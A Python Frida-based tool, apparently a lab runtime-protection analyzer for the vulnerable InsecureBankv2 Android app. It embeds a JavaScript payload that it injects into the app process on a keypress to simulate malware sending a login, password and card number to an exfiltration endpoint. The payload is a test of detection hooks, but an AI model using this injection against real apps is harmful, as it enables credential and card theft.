"""
analyzer.py — RASP Dynamic Analyzer v2.0
"""
import frida, sys, json, datetime, subprocess, threading
from colorama import init, Fore, Style
init(autoreset=True)

PACKAGE      = "InsecureBankv2"
TARGET_APK   = "com.android.insecurebankv2"
session_logs = []
frida_proc   = None

# C2-скрипт который инжектируется в процесс банка по команде
C2_INJECT = """
Java.perform(function() {
    var thread = Java.use('java.lang.Thread');
    var URL    = Java.use('java.net.URL');
    var runnable = Java.registerClass({
        name: 'com.evil.MalwareC2',
        implements: [Java.use('java.lang.Runnable')],
        methods: {
            run: function() {
                try {
                    // Малварь отправляет украденные данные на C2
                    var url = URL.$new('http://10.0.2.2:9999/exfiltrate?login=jack&pass=Jack%40123&card=4111111111111111');
                    var conn = url.openConnection();
                    conn.setConnectTimeout(3000);
                    conn.setRequestMethod('POST');
                    conn.connect();
                    conn.getResponseCode(); // триггерим соединение
                } catch(e) {
                    // C2 может не ответить, но URL.$init и connect уже перехвачены
                }
            }
        }
    });
    Java.use('java.lang.Thread').$new(runnable.$new()).start();
});
"""

def save_audit_log():
    filename = f"audit_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    report = {
        "report_meta": {
            "generated_at": datetime.datetime.now().isoformat(),
            "tool": "RASP Dynamic Analyzer v2.0",
            "target_app": TARGET_APK,
            "total_events": len(session_logs)
        },
        "events": session_logs
    }
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=4, ensure_ascii=False)
    print(Fore.GREEN + Style.BRIGHT + f"\n[+] Audit report saved: {filename}")
    print(Fore.GREEN + f"[+] Total events captured: {len(session_logs)}")


def on_message(message, data):
    if message["type"] == "send":
        p = message["payload"]
        if not isinstance(p, dict):
            return
        m_type  = p.get("type", "info")
        threat  = p.get("threat", "SYSTEM")
        details = p.get("message", "")
        session_logs.append({
            "timestamp": datetime.datetime.now().isoformat(),
            "level":     m_type.upper(),
            "threat":    threat,
            "details":   details
        })
        if m_type == "info":
            print(Fore.CYAN    + f"[*] {details}")
        elif m_type == "warning":
            print(Fore.YELLOW  + f"[!] {threat} | {details}")
        elif m_type == "alert":
            print(Fore.MAGENTA + f"[-] ALERT: {threat} | {details}")
        elif m_type == "critical":
            print(Fore.RED + Style.BRIGHT + f"[!!!] CRITICAL — {threat} | {details}")
        elif m_type == "error":
            print(Fore.RED + f"[ERR] {details}")
    elif message["type"] == "error":
        print(Fore.RED + f"[FRIDA ERROR] {message.get('description', str(message))}")


def inject_c2(script_session):
    """Инжектирует C2-запрос изнутри процесса банка через текущую сессию."""
    try:
        c2_script = script_session.create_script(C2_INJECT)
        c2_script.on("message", on_message)
        c2_script.load()
        print(Fore.RED + Style.BRIGHT + "\n[SIM] C2 malware payload injected into bank process!")
    except Exception as e:
        print(Fore.RED + f"[!] C2 inject failed: {e}")


def keyboard_listener(script_session, stop_event):
    """Слушает нажатие 'c' для симуляции C2 прямо из текущей сессии."""
    print(Fore.YELLOW + "[*] Press 'c' + Enter to simulate C2 exfiltration from inside the app process.")
    print(Fore.YELLOW + "[*] Press Ctrl+C to stop and save audit.\n")
    while not stop_event.is_set():
        try:
            cmd = input()
            if cmd.strip().lower() == 'c':
                inject_c2(script_session)
        except (EOFError, KeyboardInterrupt):
            break


def main():
    print(Fore.GREEN + Style.BRIGHT + "=" * 50)
    print(Fore.GREEN + Style.BRIGHT + "  RASP Dynamic Analyzer v2.0")
    print(Fore.GREEN + Style.BRIGHT + f"  Target: {TARGET_APK}")
    print(Fore.GREEN + Style.BRIGHT + "=" * 50)

    try:
        with open("agent.js", "r", encoding="utf-8") as f:
            source = f.read()
    except FileNotFoundError:
        print(Fore.RED + "[!] agent.js not found.")
        sys.exit(1)

    cmd = ["frida", "-U", PACKAGE, "-l", "agent.js"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1)

    import re
    pattern = re.compile(r"message: (\{.*?\}) data:", re.DOTALL)

    stop_event = threading.Event()

    # Подключаемся также через Python API для C2-инжекта
    session_holder = [None]
    def connect_session():
        try:
            import time; time.sleep(3)  # ждём пока frida CLI поднимет хуки
            device = frida.get_usb_device(timeout=10)
            session_holder[0] = device.attach(PACKAGE)
        except Exception as e:
            print(Fore.YELLOW + f"[~] C2 inject unavailable: {e}")

    t_connect = threading.Thread(target=connect_session, daemon=True)
    t_connect.start()

    def kb_listen():
        t_connect.join()
        if session_holder[0]:
            keyboard_listener(session_holder[0], stop_event)
        else:
            print(Fore.YELLOW + "[*] Press Ctrl+C to stop and save audit.\n")
            try:
                sys.stdin.read()
            except KeyboardInterrupt:
                pass

    t_kb = threading.Thread(target=kb_listen, daemon=True)
    t_kb.start()

    print(Fore.GREEN + "[*] Monitoring active...\n")

    try:
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue
            match = pattern.search(line)
            if match:
                try:
                    raw = match.group(1)
                    raw = raw.replace("'", '"').replace("None", "null").replace("True", "true").replace("False", "false")
                    msg = json.loads(raw)
                    if msg.get("type") == "send" and isinstance(msg.get("payload"), dict):
                        on_message(msg, None)
                except Exception:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()
        save_audit_log()


if __name__ == "__main__":
    main()